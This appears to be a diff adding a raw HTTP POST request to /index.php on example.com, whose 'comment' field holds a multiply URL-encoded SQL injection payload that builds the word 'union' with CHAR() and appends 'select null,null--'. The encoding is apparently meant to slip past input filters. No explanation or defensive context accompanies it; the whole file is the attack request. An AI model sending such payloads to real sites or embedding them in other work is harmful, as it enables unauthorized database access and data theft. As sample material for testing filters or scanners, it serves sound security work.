@@ -1,0 +1,9 @@
+POST /index.php HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+
+comment=%27%252520CHAR%28117%2C110%2C105%2C111%2C110%29%252520select%252520null%2Cnull--
